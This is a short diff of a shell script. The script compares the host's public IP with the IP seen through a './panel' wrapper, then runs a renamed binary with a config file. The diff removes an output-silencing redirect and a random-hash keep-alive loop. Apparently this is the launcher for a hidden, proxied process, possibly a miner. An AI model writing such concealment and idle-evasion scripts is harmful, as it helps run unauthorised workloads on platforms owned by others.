@@ -21,6 +21,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./Banque_Éminence -c "config.json" >/dev/null 2>&1
-sleep 1
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
+./panel ./Banque_Éminence -c "config.json" 
